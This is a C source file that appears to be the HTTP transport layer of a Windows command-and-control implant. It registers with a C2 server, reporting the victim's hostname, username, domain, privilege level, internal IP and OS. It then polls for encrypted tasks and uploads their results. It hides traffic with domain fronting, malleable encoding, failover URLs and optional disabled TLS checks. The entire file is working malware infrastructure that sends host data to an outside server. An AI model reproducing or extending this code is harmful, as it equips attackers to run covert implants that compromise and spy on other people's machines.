#include <windows.h>
#include <winhttp.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include "../../include/config.h"
#include "../../include/transport.h"
#include "../../include/malleable.h"
#include "../../include/base64.h"
#include "../../include/json.h"
#include "../../include/crypto.h"
#include "../../include/postex.h"
#include "../../include/cert_pin.h"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")

static HINTERNET g_hSession = NULL;
static CRYPTO_CTX g_crypto;
static char g_implant_id[64] = {0};
static C2_FAILOVER g_failover;
static DOMAIN_FRONT_CONFIG g_domain_front;
static BOOL g_failover_ready = FALSE;

static const char *transport_active_url(const char *url) {
    if (g_failover_ready && g_failover.count > 0) {
        const char *fo = failover_get_url(&g_failover);
        if (fo && fo[0]) return fo;
    }
    return url;
}

static void transport_note_result(BOOL ok) {
    if (!g_failover_ready || g_failover.count <= 1) return;
    if (ok) failover_mark_success(&g_failover);
    else failover_mark_failure(&g_failover);
}

BOOL transport_init(PIMPLANT_CONFIG config) {
    if (config && config->implant_id[0])
        lstrcpynA(g_implant_id, config->implant_id, sizeof(g_implant_id));

    wchar_t wUserAgent[256];
    MultiByteToWideChar(CP_UTF8, 0, config->user_agent, -1, wUserAgent, 256);

    g_hSession = WinHttpOpen(
        wUserAgent,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!g_hSession) return FALSE;

    /* Failover URL list: compile-time C2_URL_LIST or single C2_URL */
#ifdef C2_URL_LIST
    if (C2_URL_LIST[0]) {
        failover_init(&g_failover, C2_URL_LIST);
    } else
#endif
    {
        failover_init(&g_failover, config->c2_url);
    }
    g_failover_ready = (g_failover.count > 0);

#ifdef DOMAIN_FRONT_CDN
    if (DOMAIN_FRONT_CDN[0] && DOMAIN_FRONT_HOST[0]) {
        domain_front_init(&g_domain_front, DOMAIN_FRONT_CDN, DOMAIN_FRONT_HOST);
    }
#endif

    // Set TLS 1.2+ only
    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    WinHttpSetOption(g_hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));

    return TRUE;
}

void transport_cleanup(void) {
    crypto_cleanup(&g_crypto);
    if (g_hSession) {
        WinHttpCloseHandle(g_hSession);
        g_hSession = NULL;
    }
}

// Parse URL into components for WinHTTP
static BOOL parse_url(const char *url, wchar_t *host, DWORD host_len, INTERNET_PORT *port, BOOL *use_ssl) {
    wchar_t wUrl[512];
    MultiByteToWideChar(CP_UTF8, 0, url, -1, wUrl, 512);

    URL_COMPONENTS uc;
    ZeroMemory(&uc, sizeof(uc));
    uc.dwStructSize = sizeof(uc);
    uc.lpszHostName = host;
    uc.dwHostNameLength = host_len;

    if (!WinHttpCrackUrl(wUrl, 0, 0, &uc)) return FALSE;

    *port = uc.nPort;
    *use_ssl = (uc.nScheme == INTERNET_SCHEME_HTTPS);
    return TRUE;
}

PHTTP_RESPONSE http_request(const char *url, const char *path, const char *method,
                            const BYTE *data, DWORD data_size, const char *user_agent) {
    const char *active_url = transport_active_url(url);

    wchar_t wHost[256] = {0};
    INTERNET_PORT port = 443;
    BOOL use_ssl = TRUE;

    if (!parse_url(active_url, wHost, 256, &port, &use_ssl)) {
        transport_note_result(FALSE);
        return NULL;
    }

    /* Domain fronting: TCP connect to CDN, Host header to actual C2 domain */
    wchar_t wConnectHost[256];
    if (g_domain_front.enabled) {
        const char *cdn = domain_front_connect_host(&g_domain_front, active_url);
        MultiByteToWideChar(CP_UTF8, 0, cdn, -1, wConnectHost, 256);
    } else {
        lstrcpynW(wConnectHost, wHost, 256);
    }

    HINTERNET hConnect = WinHttpConnect(g_hSession, wConnectHost, port, 0);
    if (!hConnect) return NULL;

    wchar_t wPath[512];
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wPath, 512);

    wchar_t wMethod[16];
    MultiByteToWideChar(CP_UTF8, 0, method, -1, wMethod, 16);

    DWORD flags = use_ssl ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, wMethod, wPath, NULL,
                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        transport_note_result(FALSE);
        return NULL;
    }

    if (g_domain_front.enabled)
        domain_front_apply(hRequest, &g_domain_front);

    if (use_ssl) {
#ifdef CERT_PIN_HASH
        cert_pin_install_callback(hRequest);
        cert_pin_apply_tls_flags(hRequest);
#elif defined(LAB_NO_TLS_VERIFY)
        {
            DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                             SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                             SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
            WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
        }
#endif
    }

    // Profile HTTP headers + content type for POST
    wchar_t wHeaders[512] = {0};
    if (data && data_size > 0) {
        malleable_build_headers(wHeaders, 512);
        if (g_implant_id[0]) {
            wchar_t id_hdr[128];
            wchar_t wid[64];
            MultiByteToWideChar(CP_UTF8, 0, g_implant_id, -1, wid, 64);
            _snwprintf(id_hdr, 128, L"X-Implant-Id: %s\r\n", wid);
            lstrcatW(wHeaders, id_hdr);
        }
    }

    BOOL sent = WinHttpSendRequest(hRequest, wHeaders[0] ? wHeaders : WINHTTP_NO_ADDITIONAL_HEADERS,
                                   wHeaders[0] ? -1L : 0,
                                   (LPVOID)data, data_size, data_size, 0);
    if (!sent) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        transport_note_result(FALSE);
        return NULL;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        transport_note_result(FALSE);
        return NULL;
    }

#ifdef CERT_PIN_HASH
    if (use_ssl && cert_pin_failed()) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        transport_note_result(FALSE);
        return NULL;
    }
#endif

    // Get status code
    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);

    // Read response body
    DWORD totalSize = 0;
    DWORD bufCap = INITIAL_BUF_SIZE;
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufCap);
    if (!buf) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        transport_note_result(FALSE);
        return NULL;
    }

    DWORD bytesRead = 0;
    while (WinHttpReadData(hRequest, buf + totalSize, bufCap - totalSize, &bytesRead)) {
        if (bytesRead == 0) break;
        totalSize += bytesRead;

        if (totalSize >= bufCap - 1024) {
            bufCap *= 2;
            if (bufCap > MAX_OUTPUT_SIZE) break;
            BYTE *newBuf = (BYTE *)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, bufCap);
            if (!newBuf) break;
            buf = newBuf;
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);

    PHTTP_RESPONSE resp = (PHTTP_RESPONSE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(HTTP_RESPONSE));
    if (!resp) {
        HeapFree(GetProcessHeap(), 0, buf);
        return NULL;
    }

    resp->data = buf;
    resp->size = totalSize;
    resp->status_code = statusCode;

    if (totalSize > 0 && resp->status_code == 200) {
        BYTE *body = buf;
        DWORD body_len = totalSize;
        BOOL body_owned = FALSE;

        if (g_crypto.initialized) {
            BYTE *enc_raw = (BYTE *)malloc(MAX_OUTPUT_SIZE);
            if (!enc_raw) {
                HeapFree(GetProcessHeap(), 0, buf);
                HeapFree(GetProcessHeap(), 0, resp);
                return NULL;
            }
            DWORD enc_len = b64_decode((const char *)buf, totalSize, enc_raw, MAX_OUTPUT_SIZE);
            HeapFree(GetProcessHeap(), 0, buf);
            buf = NULL;

            if (enc_len == 0) {
                free(enc_raw);
                HeapFree(GetProcessHeap(), 0, resp);
                return NULL;
            }

            DWORD pt_len = 0;
            body = crypto_decrypt(&g_crypto, enc_raw, enc_len, &pt_len);
            free(enc_raw);
            if (!body || pt_len == 0) {
                if (body) HeapFree(GetProcessHeap(), 0, body);
                HeapFree(GetProcessHeap(), 0, resp);
                return NULL;
            }
            body_len = pt_len;
            body_owned = TRUE;
        }

        BYTE *decoded = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_OUTPUT_SIZE);
        if (decoded) {
            DWORD dlen = malleable_decode_inbound(body, body_len, decoded, MAX_OUTPUT_SIZE);
            if (dlen > 0) {
                resp->data = decoded;
                resp->size = dlen;
            } else {
                HeapFree(GetProcessHeap(), 0, decoded);
            }
        }

        if (body_owned)
            HeapFree(GetProcessHeap(), 0, body);
        else if (buf)
            HeapFree(GetProcessHeap(), 0, buf);
    }

    if (resp->status_code == 200)
        transport_note_result(TRUE);
    else
        transport_note_result(FALSE);

    return resp;
}

PHTTP_RESPONSE http_post(const char *url, const char *path, const BYTE *data, DWORD data_size, const char *user_agent) {
    BYTE wire[MAX_OUTPUT_SIZE];
    DWORD wire_len = data_size;
    const BYTE *send = data;
    BYTE *enc_buf = NULL;

    if (data && data_size > 0) {
        wire_len = malleable_encode_outbound(data, data_size, wire, sizeof(wire));
        if (wire_len > 0) send = wire;

        if (g_crypto.initialized) {
            DWORD enc_len = 0;
            enc_buf = crypto_encrypt(&g_crypto, send, wire_len, &enc_len);
            if (!enc_buf) return NULL;

            char b64[MAX_OUTPUT_SIZE * 2];
            DWORD b64_len = b64_encode(enc_buf, enc_len, b64, sizeof(b64));
            HeapFree(GetProcessHeap(), 0, enc_buf);
            enc_buf = NULL;

            if (b64_len == 0 || b64_len >= sizeof(wire)) return NULL;
            CopyMemory(wire, b64, b64_len);
            wire_len = b64_len;
            send = wire;
        }
    }
    return http_request(url, path, "POST", send, wire_len, user_agent);
}

PHTTP_RESPONSE http_get(const char *url, const char *path, const char *user_agent) {
    return http_request(url, path, "GET", NULL, 0, user_agent);
}

void http_response_free(PHTTP_RESPONSE resp) {
    if (!resp) return;
    if (resp->data) HeapFree(GetProcessHeap(), 0, resp->data);
    HeapFree(GetProcessHeap(), 0, resp);
}

static int json_step(int *pos, char *buf, int cap, int n) {
    if (n < 0 || *pos + n >= cap) return -1;
    *pos += n;
    return 0;
}

static int json_comma(int *pos, char *buf, int cap) {
    if (*pos + 1 >= cap) return -1;
    buf[(*pos)++] = ',';
    return 0;
}

static void get_internal_ip(char *buf, int buf_size) {
    buf[0] = '\0';

    ULONG size = 0;
    GetAdaptersAddresses(AF_INET, GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER,
                         NULL, NULL, &size);

    IP_ADAPTER_ADDRESSES *addrs = (IP_ADAPTER_ADDRESSES *)HeapAlloc(GetProcessHeap(), 0, size);
    if (!addrs) return;

    if (GetAdaptersAddresses(AF_INET, GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER,
                             NULL, addrs, &size) == NO_ERROR) {
        for (IP_ADAPTER_ADDRESSES *a = addrs; a; a = a->Next) {
            if (a->OperStatus != IfOperStatusUp) continue;
            if (a->IfType == IF_TYPE_SOFTWARE_LOOPBACK) continue;

            for (IP_ADAPTER_UNICAST_ADDRESS *u = a->FirstUnicastAddress; u; u = u->Next) {
                struct sockaddr_in *sa = (struct sockaddr_in *)u->Address.lpSockaddr;
                char ip[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &sa->sin_addr, ip, sizeof(ip));

                if (strncmp(ip, "169.254.", 8) == 0) continue;
                if (strcmp(ip, "127.0.0.1") == 0) continue;

                strncpy(buf, ip, buf_size - 1);
                buf[buf_size - 1] = '\0';
                HeapFree(GetProcessHeap(), 0, addrs);
                return;
            }
        }
    }
    HeapFree(GetProcessHeap(), 0, addrs);

    if (buf[0] == '\0')
        strncpy(buf, "0.0.0.0", buf_size - 1);
}

static void get_os_info(char *os_str, int os_size, char *arch_str, int arch_size) {
    OSVERSIONINFOEXW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);

    typedef NTSTATUS (WINAPI *RtlGetVersionFunc)(POSVERSIONINFOEXW);
    RtlGetVersionFunc pRtlGetVersion = (RtlGetVersionFunc)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "RtlGetVersion");

    if (pRtlGetVersion && pRtlGetVersion(&osvi) == 0) {
        _snprintf(os_str, os_size, "Windows %lu.%lu.%lu",
                  osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    } else {
        strncpy(os_str, "Windows", os_size - 1);
    }
    os_str[os_size - 1] = '\0';

    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    switch (si.wProcessorArchitecture) {
    case PROCESSOR_ARCHITECTURE_AMD64:
        strncpy(arch_str, "x64", arch_size - 1);
        break;
    case PROCESSOR_ARCHITECTURE_INTEL:
        strncpy(arch_str, "x86", arch_size - 1);
        break;
    case PROCESSOR_ARCHITECTURE_ARM64:
        strncpy(arch_str, "arm64", arch_size - 1);
        break;
    default:
        strncpy(arch_str, "unknown", arch_size - 1);
        break;
    }
    arch_str[arch_size - 1] = '\0';
}

// Build JSON registration payload
static DWORD build_register_payload(PIMPLANT_CONFIG config, const char *pubkey_b64,
                                    BYTE *buf, DWORD buf_size) {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD hostname_len = sizeof(hostname);
    GetComputerNameA(hostname, &hostname_len);

    char username[256] = {0};
    DWORD username_len = sizeof(username);
    GetUserNameA(username, &username_len);

    char domain[256] = {0};
    GetEnvironmentVariableA("USERDOMAIN", domain, sizeof(domain));

    DWORD pid = GetCurrentProcessId();
    BOOL elevated = FALSE;

    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elev;
        DWORD size;
        if (GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &size)) {
            elevated = elev.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    char procname[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, procname, MAX_PATH);
    char *basename = procname;
    for (char *p = procname; *p; p++) {
        if (*p == '\\' || *p == '/') basename = p + 1;
    }

    char ip[64] = {0};
    char os[128] = {0};
    char arch[16] = {0};
    get_internal_ip(ip, sizeof(ip));
    get_os_info(os, sizeof(os), arch, sizeof(arch));

    int cap = (int)buf_size;
    int pos = 0;
    char *out = (char *)buf;
    const char *enum_json = auto_enum_peek();

    if (cap < 2) return 0;
    out[pos++] = '{';

    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "implant_id", config->implant_id)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "hostname", hostname)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "username", username)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "domain", domain)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv_int(out + pos, cap - pos, "os", 1)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "arch", arch)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv_int(out + pos, cap - pos, "pid", (int)pid)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "process_name", basename)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv_bool(out + pos, cap - pos, "elevated", elevated)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "internal_ip", ip)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "os_version", os)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "build_id", BUILD_ID)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "build_token", BUILD_TOKEN)) < 0) return 0;
    if (json_comma(&pos, out, cap) < 0) return 0;
    if (json_step(&pos, out, cap, json_emit_kv(out + pos, cap - pos, "pubkey", pubkey_b64 ? pubkey_b64 : "")) < 0) return 0;
    if (enum_json && enum_json[0]) {
        if (json_comma(&pos, out, cap) < 0) return 0;
        if (json_step(&pos, out, cap, json_emit_kv_raw(out + pos, cap - pos, "auto_enum", enum_json)) < 0) return 0;
    }
    if (pos + 1 >= cap) return 0;
    out[pos++] = '}';
    out[pos] = '\0';
    return (DWORD)pos;
}

BOOL transport_register(PIMPLANT_CONFIG config) {
    BYTE pubkey_raw[128];
    DWORD pubkey_len = sizeof(pubkey_raw);

    crypto_cleanup(&g_crypto);
    if (!crypto_init(&g_crypto, pubkey_raw, &pubkey_len))
        return FALSE;

    char pubkey_b64[256];
    pubkey_b64[0] = '\0';
    if (b64_encode(pubkey_raw, pubkey_len, pubkey_b64, sizeof(pubkey_b64)) == 0)
        return FALSE;

    BYTE payload[2048];
    DWORD payload_size = build_register_payload(config, pubkey_b64, payload, sizeof(payload));
    if (payload_size == 0)
        return FALSE;

    PHTTP_RESPONSE resp = http_post(transport_active_url(config->c2_url), config->register_path, payload, payload_size, config->user_agent);
    if (!resp) return FALSE;

    BOOL success = (resp->status_code == 200);
    if (success && resp->data && resp->size > 10) {
        int interval = 0, jitter = 0;
        json_find_int((const char *)resp->data, "interval", &interval);
        json_find_int((const char *)resp->data, "jitter", &jitter);
        if (interval > 0) config->sleep_seconds = (DWORD)interval;
        if (jitter >= 0 && jitter <= 100) config->jitter_percent = (DWORD)jitter;

        char server_pubkey_b64[256];
        server_pubkey_b64[0] = '\0';
        if (json_find_string((const char *)resp->data, "server_pubkey",
                             server_pubkey_b64, sizeof(server_pubkey_b64))) {
            BYTE server_pubkey[128];
            DWORD sp_len = b64_decode(server_pubkey_b64, (DWORD)lstrlenA(server_pubkey_b64),
                                      server_pubkey, sizeof(server_pubkey));
            if (sp_len == 0 || !crypto_derive_session_key(&g_crypto, server_pubkey, sp_len))
                success = FALSE;
            else
                crypto_set_session_id(&g_crypto, config->implant_id);
        } else {
            success = FALSE;
        }
    }
    if (success && config->implant_id[0])
        lstrcpynA(g_implant_id, config->implant_id, sizeof(g_implant_id));
    http_response_free(resp);
    return success;
}

// Parse task array from JSON response
// Format: {"tasks":[{"id":"uuid","type":10,"data":"base64"},...]}}
DWORD transport_parse_tasks(const char *json, DWORD json_len, PC2_TASK *out_tasks) {
    *out_tasks = NULL;
    const char *json_end = json + json_len;
    const char *arr_start = strstr(json, "\"tasks\":[");
    if (!arr_start || arr_start >= json_end) return 0;
    arr_start += 9;

    DWORD count = 0;
    const char *scan = arr_start;
    while (scan < json_end && *scan && *scan != ']') {
        if (*scan == '{') {
            const char *obj_end = json_find_object_end(scan, json_end);
            if (!obj_end) break;
            count++;
            scan = obj_end + 1;
        } else {
            scan++;
        }
    }
    if (count == 0) return 0;

    PC2_TASK tasks = (PC2_TASK)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, count * sizeof(C2_TASK));
    if (!tasks) return 0;

    const char *p = arr_start;
    for (DWORD i = 0; i < count && p < json_end && *p; i++) {
        while (p < json_end && *p && *p != '{') p++;
        if (p >= json_end || !*p) break;

        const char *obj_end = json_find_object_end(p, json_end);
        if (!obj_end) break;

        json_find_string(p, "id", tasks[i].id, sizeof(tasks[i].id));

        int task_type = 0;
        json_find_int(p, "type", &task_type);
        tasks[i].type = (DWORD)task_type;

        char *data_b64 = (char *)malloc(MAX_OUTPUT_SIZE);
        if (!data_b64) {
            for (DWORD j = 0; j <= i; j++) {
                if (tasks[j].data) HeapFree(GetProcessHeap(), 0, tasks[j].data);
            }
            HeapFree(GetProcessHeap(), 0, tasks);
            return 0;
        }
        data_b64[0] = '\0';
        json_find_string(p, "data", data_b64, MAX_OUTPUT_SIZE);
        DWORD b64_len = (DWORD)lstrlenA(data_b64);
        if (b64_len > 0) {
            DWORD alloc_size = (b64_len * 3) / 4 + 4;
            if (alloc_size > MAX_TASK_DATA) {
                free(data_b64);
                p = obj_end + 1;
                continue;
            }
            tasks[i].data_size = alloc_size;
            tasks[i].data = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, tasks[i].data_size);
            if (tasks[i].data) {
                tasks[i].data_size = b64_decode(data_b64, b64_len, tasks[i].data, tasks[i].data_size);
                if (tasks[i].data_size > MAX_TASK_DATA) {
                    HeapFree(GetProcessHeap(), 0, tasks[i].data);
                    tasks[i].data = NULL;
                    tasks[i].data_size = 0;
                }
            }
        }
        free(data_b64);

        p = obj_end + 1;
    }

    *out_tasks = tasks;
    return count;
}

BOOL transport_checkin(PIMPLANT_CONFIG config, PC2_TASK *tasks, DWORD *task_count) {
    *tasks = NULL;
    *task_count = 0;

    char payload[256];
    int pos = 0;
    int cap = (int)sizeof(payload);
    payload[pos++] = '{';
    if (json_step(&pos, payload, cap, json_emit_kv(payload + pos, cap - pos, "id", config->implant_id)) < 0)
        return FALSE;
    if (pos + 1 >= cap) return FALSE;
    payload[pos++] = '}';
    int len = pos;

    PHTTP_RESPONSE resp = http_post(transport_active_url(config->c2_url), config->checkin_path, (BYTE *)payload, (DWORD)len, config->user_agent);
    if (!resp) return FALSE;

    if (resp->status_code != 200) {
        http_response_free(resp);
        return FALSE;
    }

    if (resp->size > 15) {
        *task_count = transport_parse_tasks((const char *)resp->data, resp->size, tasks);
    }

    http_response_free(resp);
    return TRUE;
}

BOOL transport_send_result(PIMPLANT_CONFIG config, PC2_RESULT result) {
    DWORD error_len = (DWORD)lstrlenA(result->error);

    // Calculate base64 size for output data
    DWORD b64_size = ((result->data_size + 2) / 3) * 4 + 1;
    DWORD json_size = 256 + error_len + b64_size;

    char *payload = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, json_size);
    if (!payload) return FALSE;

    // Encode output data as base64
    char *b64_data = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, b64_size);
    if (!b64_data) {
        HeapFree(GetProcessHeap(), 0, payload);
        return FALSE;
    }

    if (result->data && result->data_size > 0) {
        b64_encode(result->data, result->data_size, b64_data, b64_size);
    }

    int pos = 0;
    int cap = (int)json_size;
    payload[pos++] = '{';
    if (json_step(&pos, payload, cap, json_emit_kv(payload + pos, cap - pos, "task_id", result->task_id)) < 0 ||
        json_comma(&pos, payload, cap) < 0 ||
        json_step(&pos, payload, cap, json_emit_kv(payload + pos, cap - pos, "output", b64_data)) < 0 ||
        json_comma(&pos, payload, cap) < 0 ||
        json_step(&pos, payload, cap, json_emit_kv(payload + pos, cap - pos, "error", result->error)) < 0 ||
        pos + 1 >= cap) {
        HeapFree(GetProcessHeap(), 0, b64_data);
        HeapFree(GetProcessHeap(), 0, payload);
        return FALSE;
    }
    payload[pos++] = '}';
    int written = pos;

    PHTTP_RESPONSE resp = http_post(transport_active_url(config->c2_url), config->result_path,
                                     (BYTE *)payload, (DWORD)written, config->user_agent);

    HeapFree(GetProcessHeap(), 0, b64_data);
    HeapFree(GetProcessHeap(), 0, payload);

    if (!resp) return FALSE;
    BOOL success = (resp->status_code == 200);
    http_response_free(resp);
    return success;
}

BOOL transport_get_session_key(BYTE *key_out, DWORD key_len) {
    if (!key_out || key_len < 32 || !g_crypto.initialized)
        return FALSE;
    CopyMemory(key_out, g_crypto.session_key, 32);
    return TRUE;
}
